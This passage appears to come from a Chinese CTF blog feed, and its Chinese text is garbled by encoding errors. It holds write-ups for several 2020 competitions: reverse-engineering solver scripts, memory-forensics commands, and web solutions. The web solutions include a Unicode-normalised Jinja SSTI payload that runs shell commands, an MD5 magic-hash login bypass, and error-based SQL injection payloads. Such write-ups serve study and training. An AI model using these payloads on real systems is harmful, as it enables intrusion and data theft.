<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="å¤å…¸ç¾"><a href="#å¤å…¸ç¾" class="headerlink" title="å¤å…¸ç¾++"></a>å¤å…¸ç¾++</h3><p><a href="https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx" target="_blank" rel="noopener">https://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx</a></p>
<p>orderby</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="re2-easyre"><a href="#re2-easyre" class="headerlink" title="re2(easyre)"></a>re2(easyre)</h3><p>odåŠ¨æ€è°ƒè¯•ï¼Œå…ˆæ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º24ï¼Œç»§ç»­è°ƒè¯•å‘ç°åŠ å¯†ç®—æ³•ä¸ºï¼šenc[i] = (flag[i]&lt;&lt;3)^(flag[i+1]&gt;&gt;5),enc[23] = (flag[0]&amp;0x0e)^(flag[23]&lt;&lt;3)ï¼Œå¯†æ–‡ä¸ºï¼š</p>
<pre class=" language-plain"><code class="language-plain">0x2B, 0x08, 0xA9, 0xc8, 0x97, 0x2f, 0xff, 0x8C, 0x92, 0xf0, 0xA3, 0x89, 0xF7, 0x26, 0x07, 0xA4, 0xDA, 0xEA, 0xB3, 0x91, 0xEF, 0xDC, 0x95, 0xAB</code></pre>
<p>ä½¿ç”¨è¿™z3è„šæœ¬è§£å¯†ï¼š</p>
<pre class=" language-plain"><code class="language-plain">from z3 import *
enc = [0x2B, 0x08, 0xA9, 0xc8, 0x97, 0x2f, 0xff, 0x8C, 0x92, 0xf0, 0xA3, 0x89, 0xF7, 0x26, 0x07, 0xA4, 0xDA, 0xEA, 0xB3, 0x91, 0xEF, 0xDC, 0x95, 0xAB]
if __name__ == '__main__':
    flag = [101,97,53,121,114,101,95,49,115,95,53,48,95,101,97,53,121,95,116,48,95,121,48,117]
    d = ''
    for i in flag:
        d += chr(i)
    print d
    v1 = BitVec('v1',8)
    v2 = BitVec('v2',8)
    v3 = BitVec('v3',8)
    v4 = BitVec('v4',8)
    v5 = BitVec('v5',8)
    v6 = BitVec('v6',8)
    v7 = BitVec('v7',8)
    v8 = BitVec('v8',8)
    v9 = BitVec('v9',8)
    v10 = BitVec('v10',8)
    v11 = BitVec('v11',8)
    v12 = BitVec('v12',8)
    v13 = BitVec('v13',8)
    v14 = BitVec('v14',8)
    v15 = BitVec('v15',8)
    v16 = BitVec('v16',8)
    v17 = BitVec('v17',8)
    v18 = BitVec('v18',8)
    v19 = BitVec('v19',8)
    v20 = BitVec('v20',8)
    v21 = BitVec('v21',8)
    v22 = BitVec('v22',8)
    v23 = BitVec('v23',8)
    v24 = BitVec('v24',8)
    s = Solver()
    s.add((v24<<3)^((v1 & 0xe0)>>5)==enc[23])
    s.add((((v1<<3)^(v2>>5))^0)==enc[0])
    s.add((((v2<<3)^(v3>>5))^1)==enc[1])
    s.add((((v3<<3)^(v4>>5))^2)==enc[2])
    s.add((((v4<<3)^(v5>>5))^3)==enc[3])
    s.add((((v5<<3)^(v6>>5))^4)==enc[4])
    s.add((((v6<<3)^(v7>>5))^5)==enc[5])
    s.add((((v7<<3)^(v8>>5))^6)==enc[6])
    s.add((((v8<<3)^(v9>>5))^7)==enc[7])
    s.add((((v9<<3)^(v10>>5))^8)==enc[8])
    s.add((((v10<<3)^(v11>>5))^9)==enc[9])
    s.add((((v11<<3)^(v12>>5))^10)==enc[10])
    s.add((((v12<<3)^(v13>>5))^11)==enc[11])
    s.add((((v13<<3)^(v14>>5))^12)==enc[12])
    s.add((((v14<<3)^(v15>>5))^13)==enc[13])
    s.add((((v15<<3)^(v16>>5))^14)==enc[14])
    s.add((((v16<<3)^(v17>>5))^15)==enc[15])
    s.add((((v17<<3)^(v18>>5))^16)==enc[16])
    s.add((((v18<<3)^(v19>>5))^17)==enc[17])
    s.add((((v19<<3)^(v20>>5))^18)==enc[18])
    s.add((((v20<<3)^(v21>>5))^19)==enc[19])
    s.add((((v21<<3)^(v22>>5))^20)==enc[20])
    s.add((((v22<<3)^(v23>>5))^21)==enc[21])
    s.add((((v23<<3)^(v24>>5))^22)==enc[22])
    if s.check() == sat:
        print s.model()</code></pre>
<p>flag:md5(ea5yre_1s_50_ea5y_t0_y0u)</p>
<h3 id="ReMe"><a href="#ReMe" class="headerlink" title="ReMe"></a>ReMe</h3><p>ä½¿ç”¨IDAæ‰“å¼€æ–‡ä»¶ï¼ŒæŸ¥çœ‹å­—ç¬¦ä¸²å‘ç°æ—¶Pythonå†™çš„ä»£ç è½¬ä¸ºexeæ–‡ä»¶ï¼Œä½¿ç”¨<a href="https://github.com/countercept/python-exe-unpacker" target="_blank" rel="noopener">https://github.com/countercept/python-exe-unpacker</a>è¿”æ±‡ç¼–å‡ºpycæ–‡ä»¶ï¼Œä½¿ç”¨structçš„å¤´16ä¸ªå­—ç¬¦è¡¥å…¨ReMeçš„magic numberï¼Œä½¿ç”¨uncomply6å°†ReMe.pycè½¬ä¸ºpythonæ–‡ä»¶ï¼š</p>
<p>import sys, hashlib</p>
<p>check = [</p>
<p>â€˜e5438e78ec1de10a2693f9cffb930d23â€™,</p>
<p>â€˜08e8e8855af8ea652df54845d21b9d67â€™,</p>
<p>â€˜a905095f0d801abd5865d649a646b397â€™,</p>
<p>â€˜bac8510b0902185146c838cdf8ead8e0â€™,</p>
<p>â€˜f26f009a6dc171e0ca7a4a770fecd326â€™,</p>
<p>â€˜cffd0b9d37e7187483dc8dd19f4a8fa8â€™,</p>
<p>â€˜4cb467175ab6763a9867b9ed694a2780â€™,</p>
<p>â€˜8e50684ac9ef90dfdc6b2e75f2e23741â€™,</p>
<p>â€˜cffd0b9d37e7187483dc8dd19f4a8fa8â€™,</p>
<p>â€˜fd311e9877c3db59027597352999e91fâ€™,</p>
<p>â€˜49733de19d912d4ad559736b1ae418a7â€™,</p>
<p>â€˜7fb523b42413495cc4e610456d1f1c84â€™,</p>
<p>â€˜8e50684ac9ef90dfdc6b2e75f2e23741â€™,</p>
<p>â€˜acb465dc618e6754de2193bf0410aafeâ€™,</p>
<p>â€˜bc52c927138231e29e0b05419e741902â€™,</p>
<p>â€˜515b7eceeb8f22b53575afec4123e878â€™,</p>
<p>â€˜451660d67c64da6de6fadc66079e1d8aâ€™,</p>
<p>â€˜8e50684ac9ef90dfdc6b2e75f2e23741â€™,</p>
<p>â€˜fe86104ce1853cb140b7ec0412d93837â€™,</p>
<p>â€˜acb465dc618e6754de2193bf0410aafeâ€™,</p>
<p>â€˜c2bab7ea31577b955e2c2cac680fb2f4â€™,</p>
<p>â€˜8e50684ac9ef90dfdc6b2e75f2e23741â€™,</p>
<p>â€˜f077b3a47c09b44d7077877a5aff3699â€™,</p>
<p>â€˜620741f57e7fafe43216d6aa51666f1dâ€™,</p>
<p>â€˜9e3b206e50925792c3234036de6a25abâ€™,</p>
<p>â€˜49733de19d912d4ad559736b1ae418a7â€™,</p>
<p>â€˜874992ac91866ce1430687aa9f7121fcâ€™]</p>
<p>def func(num):</p>
<p>result = []</p>
<p>while num != 1:</p>
<p>num = num * 3 + 1 if num % 2 else num // 2</p>
<p>result.append(num)</p>
<p>return result</p>
<p>if <strong>name</strong> == â€˜<strong>main</strong>â€˜:</p>
<p>print(â€˜Your input is not the FLAG!â€™)</p>
<p>inp = input()</p>
<p>if len(inp) != 27:</p>
<p>print(â€˜length error!â€™)</p>
<p>sys.exit(-1)</p>
<p>for i, ch in enumerate(inp):</p>
<p>ret_list = func(ord(ch))</p>
<p>s = â€˜â€™</p>
<p>for idx in range(len(ret_list)):</p>
<p>s += str(ret_list[idx])</p>
<p>s += str(ret_list[(len(ret_list) - idx - 1)])</p>
<p>md5 = hashlib.md5()</p>
<p>md5.update(s.encode(â€˜utf-8â€™))</p>
<p>if md5.hexdigest() != check[i]:</p>
<p>sys.exit(i)</p>
<p>md5 = hashlib.md5()</p>
<p>md5.update(inp.encode(â€˜utf-8â€™))</p>
<p>print(â€˜You win!â€™)</p>
<p>print(â€˜flag{â€˜ + md5.hexdigest() + â€˜}â€™)</p>
<p>ä½¿ç”¨è„šæœ¬çˆ†ç ´ï¼š</p>
<pre class=" language-plain"><code class="language-plain">import hashlib
ch3cke = ['e5438e78ec1de10a2693f9cffb930d23','08e8e8855af8ea652df54845d21b9d67','a905095f0d801abd5865d649a646b397','bac8510b0902185146c838cdf8ead8e0','f26f009a6dc171e0ca7a4a770fecd326','cffd0b9d37e7187483dc8dd19f4a8fa8','4cb467175ab6763a9867b9ed694a2780','8e50684ac9ef90dfdc6b2e75f2e23741','cffd0b9d37e7187483dc8dd19f4a8fa8','fd311e9877c3db59027597352999e91f','49733de19d912d4ad559736b1ae418a7','7fb523b42413495cc4e610456d1f1c84','8e50684ac9ef90dfdc6b2e75f2e23741','acb465dc618e6754de2193bf0410aafe','bc52c927138231e29e0b05419e741902','515b7eceeb8f22b53575afec4123e878','451660d67c64da6de6fadc66079e1d8a','8e50684ac9ef90dfdc6b2e75f2e23741','fe86104ce1853cb140b7ec0412d93837','acb465dc618e6754de2193bf0410aafe','c2bab7ea31577b955e2c2cac680fb2f4','8e50684ac9ef90dfdc6b2e75f2e23741','f077b3a47c09b44d7077877a5aff3699','620741f57e7fafe43216d6aa51666f1d','9e3b206e50925792c3234036de6a25ab','49733de19d912d4ad559736b1ae418a7','874992ac91866ce1430687aa9f7121fc']
def func(num):
    result = []
    while num != 1:
        num = num * 3 + 1 if num % 2 else num // 2
        result.append(num)
    return result
if __name__ == '__main__':
    flag = ''
    for j in range(len(ch3cke)):
        for i in range(32, 128):
            ret_list = func(i)
            s = ''
            for idx in range(len(ret_list)):
                s += str(ret_list[idx])
                s += str(ret_list[(len(ret_list)-idx-1)])
            md5 = hashlib.md5()
            md5.update(s.encode('utf-8'))
            if md5.hexdigest() == ch3cke[j]:
                flag += chr(i)
    print flag
    md5 = hashlib.md5()
    md5.update(flag.encode('utf-8'))
    print md5.hexdigest()</code></pre>
<p>flag:<br>flag{My_M@th_3X+1_R3v_Te5t}</p>
<p>0584cfa2ce502951ef5606f6b99fc921</p>
<h3 id="easy-c"><a href="#easy-c" class="headerlink" title="easy_c++"></a>easy_c++</h3><p>ida æ‰“å¼€ç¨‹åºï¼ŒæœªåŠ å£³ï¼Œå¯†æ–‡ä¸ºï¼šâ€™7d21e&lt;e3&lt;:3;9;ji t r#wâ€$<em>{</em>+*$|,â€™ï¼ŒåŠ å¯†æ–¹å¼ä¸ºï¼šflag[i]^iï¼Œè§£å¯†å¾—ï¼š</p>
<p>flag = â€˜â€™</p>
<p>for i in range(len(s)):</p>
<p>flag += chr(ord(s[i])^i)</p>
<p>flagï¼š</p>
<p>7e02a9c4439056df0e2a7b432b0069b3</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E6%B9%96%E6%B9%98%E6%9D%AF/pwn.png" alt="å›¾ç‰‡"></p>
<p>3f7ee29ac4b67dc52a1b52b7245662b8</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020å¤ªæ¹–æ¯WP</title>
    <url>/2020/11/07/tai-hu-bei-2020/</url>
    <content><![CDATA[<blockquote>
<p>æ¯”èµ›é¢˜ç›®éƒ½å­˜äº†ä¸€ä»½æ‰“åŒ…ä¸Šä¼ äº†ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š</p>
<p>é“¾æ¥: <a href="https://pan.baidu.com/s/1LtiIfyD6kxkwP1m_7pGaEQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1LtiIfyD6kxkwP1m_7pGaEQ</a>  å¯†ç : l8ir</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="checkingameã€å·²è§£å†³ã€‘"><a href="#checkingameã€å·²è§£å†³ã€‘" class="headerlink" title="checkingameã€å·²è§£å†³ã€‘"></a>checkingameã€å·²è§£å†³ã€‘</h3><p>æ§åˆ¶å°æ‰§è¡Œ</p>
<pre class=" language-plain"><code class="language-plain">var game = new Game();
game.winning()</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web1.png" alt="å›¾ç‰‡"></p>
<h3 id="easywebã€å·²è§£å†³ã€‘"><a href="#easywebã€å·²è§£å†³ã€‘" class="headerlink" title="easywebã€å·²è§£å†³ã€‘"></a>easywebã€å·²è§£å†³ã€‘</h3><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>åˆ©ç”¨unicodeç¼–ç è§„èŒƒåŒ–ç»•è¿‡wafï¼Œå†åŠ SSTI</p>
<p>payloadï¼š</p>
<pre class=" language-plain"><code class="language-plain">ï¹›ï¹›config.__class__.__init__.__globals__[ï¼‡osï¼‡].popen(ï¼‡ls /ï¼‡).read()ï¹œï¹œ
ï¹›ï¹›config.__class__.__init__.__globals__[ï¼‡osï¼‡].popen(ï¼‡cat /flagï¼‡).read()ï¹œï¹œ</code></pre>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/211363#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/211363#h2-2</a></p>
</blockquote>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web2.png" alt="å›¾ç‰‡"></p>
<h3 id="crossfire"><a href="#crossfire" class="headerlink" title="crossfire"></a>crossfire</h3><h3 id="ezMD5ã€å·²è§£å†³ã€‘"><a href="#ezMD5ã€å·²è§£å†³ã€‘" class="headerlink" title="ezMD5ã€å·²è§£å†³ã€‘"></a>ezMD5ã€å·²è§£å†³ã€‘</h3><pre class=" language-php"><code class="language-php">
<span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">auth</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>  <span class="token keyword">and</span> <span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token keyword">echo</span> <span class="token string">"bingo : &lt;b>$flag&lt;/b>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>æ•°ç»„æŠ¥é”™<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web3.png" alt="å›¾ç‰‡"></p>
<p><a href="http://122.112.253.121:10032/robots.txt" target="_blank" rel="noopener">http://122.112.253.121:10032/robots.txt</a></p>
<p>auth.so</p>
<p>payloadï¼š</p>
<pre class=" language-plain"><code class="language-plain">name=240610708&password=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO&submit=%E7%99%BB%E5%BD%95</code></pre>
<p><a href="https://ctftime.org/writeup/11325" target="_blank" rel="noopener">https://ctftime.org/writeup/11325</a><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/web3-2.png" alt="å›¾ç‰‡"></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="memoryã€å·²è§£å†³ã€‘"><a href="#memoryã€å·²è§£å†³ã€‘" class="headerlink" title="memoryã€å·²è§£å†³ã€‘"></a>memoryã€å·²è§£å†³ã€‘</h3><p>flag{From_Mem_to_find_ans}</p>
<pre class=" language-plain"><code class="language-plain">vol.py -f dump --profile=Win7SP1x86_23418 pslist
vol.py -f dump --profile=Win7SP1x86_23418 dlllist
ä¸Šé¢çš„æ²¡å‘ç°ä»€ä¹ˆ
çœ‹ä¸€ä¸‹æ–‡ä»¶ï¼Œå¤ªå¤š..
vol.py -f dump --profile=Win7SP1x86_23418 filescan
å‘ç°è¿›ç¨‹æœ‰æµè§ˆå™¨ï¼Œçœ‹ä¸€ä¸‹å†å²è®°å½•
vol.py -f dump --profile=Win7SP1x86_23418 iehistory
å‘ç°è¿™ä¸ªï¼š
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 2072 explorer.exe
Cache type "URL " at 0x1a45000
Record length: 0x100
Location: :2020110520201106: link3@file:///C:/Users/link3/Desktop/Untitled.png
Last modified: 2020-11-05 00:11:38 UTC+0000
Last accessed: 2020-11-04 16:11:39 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0
å»æ–‡ä»¶åˆ—è¡¨æ‰¾å¯¹åº”çš„æ–‡ä»¶ï¼Œç„¶åæå–
vol.py -f dump --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003fdf6118 --name Untitled.png -D ./
å¾—åˆ°flag</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc1-1.png" alt="å›¾ç‰‡"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc1-2.png" alt="å›¾ç‰‡"></p>
<h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><p> ç»™äº†ä¸€ä¸ªwordå’ŒåŠ å¯†çš„å‹ç¼©åŒ…</p>
<p>wordå†…å®¹base64</p>
<pre class=" language-plain"><code class="language-plain">Salted__xÂ›Â€y RÂƒÃ‹M.Ã‹JÂ˜uÃZÃ’ÂÃ³ÂœÃ‚Â€ ppÃµÃ©Ã˜Â‡DÂ´l{Ã’EGÂªÃœÂ#Ã€Ã¸ÃÂš(Â¶oÂ¨NÃ¡Ã¬@EÂ’Ã²Â‰?Ã¤)Ã¬Ã ÂµtÃšÃ³;OÂ“Ã¯AeXÃ©IÃwÂ€Ã¶Â’pÃÃÃ£ÃÃ¸Â»Ã¨KÃºX7v:;Ã¯%SÂ¬Ã’Â¾Ã¤Â…3Â–jÃ´IÂ„wÃÃ‘Ã’Â«v3$dÃKVlÂhÂ¿Â°`Â¼Âµ9Ã~Ã‚Ã¥Ã‘$6%Ã¤Ã‰Â„Ã¿Ãš5MÂ‹Â˜ÃµSÃ‰ÃÃ²Ã¢DÃ±Ã»+0Ã²Ã¶Â¬Â§ZÂ€WÃ“ÂÃ™i(Â¬Â“Â‚Â®Â§PÃ±
ÂÃ¯Ã„Ã³gHÃ‘2Ã¾ÂŒ$Ã­Â²ÂµLÂ¿ÃgÂ›OKUÂŠ[ÂmÃ½Ã…Â¾Ã˜ -.ÂÂªÃ¦_ÂœÃ¢v9Ã¹hF{Â¦Ã¼
ÃÂ€Â²xsÂ‡ÃºÃ±Â¶Â€Ã‡TÂ£ÂºÂ°a"Âº}ÂÃŒÂÃ•+Ã¬@KÃ—wÂ·Ã²Â–f19Â‚Â¥FPÂšÂ—ÃŠÂ®Â©cÃ•aI\Â¸qÃºiÂ»PÃ€Ã›ÂƒoÃ¨Ã™Ã„Ãˆ9A Ã³Ã€Ã¸irÃ¬Ã˜JSÂ“     Ã˜]+^Ã“_Â¼Ã¶Ã½Âb>Â©Ã‰Ã´X5Â™ÂtÃ¡eÃ´Â¼ÃºVÂ°(Ã¯%Ã¥Â½|X^IWÂ§!Â¢Ã®Ã«Â‹.Â¤+(Ã€Ã£QBÂ™RÃ—LÂŸD^
Ã‘Ã²Â·ÂÂ«Ã®Ã¸Â¹2Â†^Â°Ã»mÂ¶AhÃ›$]Ã™Ã˜GoY*6w"pÂ©3Ã)gÂ‰Â¯Ã¿Ã¡rpÃ¾(Ã¼1Ã¶ÂƒS
Ã BKÃ½Ã¢\I$H)Ã²ÂÃŠ{Â®9Ã¥Ã¶Â¸Ã™@Â¶-ÂµÃ¢`Â›YaÃ¾Â§Ã§Ã Ã±ÃˆYÃ½Ã‰+Ã}Â’ ÃœÂÂ¬ÂÃ§-Ã¯Ã¸EÂ¯Ã”Â›Ã•epÂˆÂ„Ãƒ[Â•Ã­ÃSÃ¾bÂ¿Ãˆ'HÂ¤Â—Âs2Ã¯AÃÂ®jÃ²ItO&ozzÃŸÂ©ÃÃÂ¶|ÂˆÃ¬QÂ‰Ã¥Â‰Ã¤Â¦Â­9"LÂ¬ÃŸÂ”Â]Ã¼BÃœÃ‘HVÃƒsÂ´sÂ‹Â¾yÂ‹PÂ“;Â¿Ã·Ã¥G-EÂ‹Ã¤SÂ·rÃ¥ÂÂÂŒ15uÂ§ÂªvzÃ³qpÂ¬Ã[qÂ¾Â“NÃ­Ã¿CÂ›)Â¤YÂª6Â³Â—Ã¹Ã‹qÃ¥Â¾qÂ‰Â‡Â’gÃ…Ã…#i,Ã¨Â¾ÃšÂ´Â»ÃÃ·!ÂœÂˆÂ™/Â¨ÃÂœ?Â­rÃ¤:fYÃ®ÂŒa0ÃÃ´~]Ã•Ã¯HkÃ·Ãƒ?JÂ¯tÂ¢~9.N>XÃ§nÂŒÂ°Ãº{BÂ¡GeÃ¼Â‚Ã­ÃÂ†"Â¶Âšu#Â‹Ã¹Ã¢0}Â«Ã‚ÂªÃ†Ã‚Â•ÂŒ[Â‘Ã·Ã§Ã’
dÂ¢Ã¼wÂ±ÃŒGÂ¬ÃgÃÂ³KÂ½.i?yÂ®Â‚CÃšVÂ°ÂˆÂƒÂ¼Â¡$
bÂ›2x o1qgÃ¾Â³ÂŒÃœÃ­ÂÂ’Ã¤Â“([Â»Â¿Ã—gz3Â›Âº~Q%Ãƒ.PUÃ_Ã¯ÂƒÂ©zÂÃ¨Â¦Ã¨Ã¾
Ã€qÂ«E[/ÂªÂ„*D
Â—Ã.Â­Â¹Â‘Â¼:ÂªÂÂ³'Â´*Ã®CÃ˜Â´DÂªÂ¡Â†ÃŠÃ‹!PÂ¶VÂšÃ¹qÃ¢Ã­Â…RÃ˜Ã¸^</code></pre>
<p>AES rabbitéƒ½ä¸è¡Œ ä¸çŸ¥é“æœ‰æ²¡æœ‰å¯†é’¥å‹¾é€‰</p>
<p>éšè—æ–‡å­—çœ‹åˆ°</p>
<p><code>waoootu.epj,nv o</code></p>
<p><code>www.verymuch.net</code></p>
<p>è§£å¯†å¾—åˆ°<code>love and peaceee</code></p>
<p>åˆšåˆšbase64è§£å¯†çš„å¸¦<code>Salted__</code>ï¼Œ å¤§æ¦‚ç‡æ˜¯rabbitåŠ å¯† </p>
<p>è§£å¯†å¾—åˆ°</p>
<pre><code>LR2TMNLCGBOHKNDGGVRFY5JWGZTDAXDVMZTDCYK4OU4GCZRYLR2TSNTCHBOHKNJUMM4VY5JVGBSTOXDVHE3DIZC4OU2TIM3ELR2TQYLGHBOHKOJWGQYFY5JWGQ3DSXDVHE3GEOC4OU2TAZJXLR2TOZRTMROHKOBVME4VY5JVGRQTIXDVHAYDEOC4OU4GCZRYLR2TSNTCHBOHKNRRGY3VY5JVHA2WKXDVHAZDOMS4OU2WGMDBLR2TKNDDHFOHKODGMU3FY5JYMFSTMXDVG5QTOYK4OU3DENBQLR2TSNRUMROHKNRSGEYVY5JVMZTDKXDVHE3GEOC4OU3TSNJXLR2TQYLFGZOHKNLGMY2VY5JVGRRTSXDVHE3DIMC4OU2TMYRULR2TKNDDHFOHKNJWMM4VY5JUMZSWKXDVGU4TGN24OU4TMM3GLR2TMY3FGJOHKOBSG4ZFY5JYGM4GCXDVGVRGGMS4OU4GCZJWLR2TKOBVMVOHKNJUHEZFY5JYGM4GCXDVG43TGZK4OU3DEMJRLR2TKNDDHFOHKNRSGQYFY5JUMYYGMXDVHAYDKZK4OU4DKYJZLR2TSNTCHBOHKNRRGBSFY5JZGVRWIXDVGU2DGNS4OU3DENBQLR2TIZTFMVOHKNRWGJTFY5JYGI3TEXDVGY2DMOK4OU4GCMZWLR2TKNTCGROHKNJUMM4VY5JZHA2TQXDVGYYTAZC4OU2TIYZZLR2TKMZXGNOHKNDGMVSVY5JVGRRTSXDVG5QTOYK4OU4DOMLDLR2TSNRUGBOHKNJWMM4VY5JUMYYGMXDVGVTGMNK4OU2TIYZZLR2TMNBWHFOHKNJUMM4VY5JUMVQTMXDVHAZTQYK4OU2TIYZZLR2TONZTMVOHKNJUME2FY5JVHE4DEXDVHE4DKOC4OU2TSOBS
</code></pre><p>base32+unicode+ä¸ä½›è®ºç¦…å¾—åˆ°ï¼š<code>Live beautifully, dream passionately, love completely.</code></p>
<p>è§£å‹ç»™çš„å‹ç¼©åŒ…ï¼Œçœ‹é¢‘è°±å›¾ï¼Œå¾—åˆ°flag</p>
<h3 id="broken-secret"><a href="#broken-secret" class="headerlink" title="broken secret"></a>broken secret</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/2020%E5%A4%AA%E6%B9%96%E6%9D%AF/misc3.png" alt="å›¾ç‰‡"></p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Certificate-Authority"><a href="#Certificate-Authority" class="headerlink" title="Certificate Authority"></a>Certificate Authority</h3><p>æˆ–è®¸ç›¸å…³ï¼š</p>
<p><a href="https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/" target="_blank" rel="noopener">https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/</a></p>
<p><a href="http://showlinkroom.me/2020/01/21/CVE-2020-0601-Research/" target="_blank" rel="noopener">http://showlinkroom.me/2020/01/21/CVE-2020-0601-Research/</a></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ç¬¬ä¹å±Šå…¨å›½ç”µä¿¡äº’è”ç½‘ç½‘å®‰ç«èµ›WP</title>
    <url>/2020/11/06/di-jiu-jie-quan-guo-dian-xin-hu-lian-wang-wang-an-jing-sai/</url>
    <content><![CDATA[<blockquote>
<p>æ¯”èµ›é¢˜ç›®éƒ½å­˜äº†ä¸€ä»½æ‰“åŒ…ä¸Šä¼ äº†ï¼Œé“¾æ¥å¦‚ä¸‹ï¼š</p>
<p>é“¾æ¥: <a href="https://pan.baidu.com/s/1YI5rWxrDW-8fXzSQOfHNig" target="_blank" rel="noopener">https://pan.baidu.com/s/1YI5rWxrDW-8fXzSQOfHNig</a>  å¯†ç : ahaq</p>
</blockquote>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easysqlã€å·²è§£å†³ã€‘"><a href="#easysqlã€å·²è§£å†³ã€‘" class="headerlink" title="easysqlã€å·²è§£å†³ã€‘"></a>easysqlã€å·²è§£å†³ã€‘</h3><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1.png" alt="å›¾ç‰‡"></p>
<p>uname=aâ€™) union select 1,extractvalue(1, concat(0x7e, (select database()),0x7e))#&amp;passwd=a</p>
<p>datavase</p>
<p>[*] security</p>
<p>Database: security</p>
<p>[5 tables]</p>
<p>+â€”â€”â€”-+</p>
<p>| emails   |</p>
<p>| flag     |</p>
<p>| referers |</p>
<p>| uagents  |</p>
<p>| users    |</p>
<p>+â€”â€”â€”-+</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1-2.png" alt="å›¾ç‰‡"></p>
<p>æŸ¥åˆ—ï¼š</p>
<pre class=" language-plain"><code class="language-plain">uname=a') union select 1,extractvalue(1, concat(0x7e, (select * from (select * from flag as a join flag b)c),0x7e))#&passwd=a</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1-3.png" alt="å›¾ç‰‡"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web1-4.png" alt="å›¾ç‰‡"></p>
<p>flag{c7651cb673c911ee8f9977094a220f17}</p>
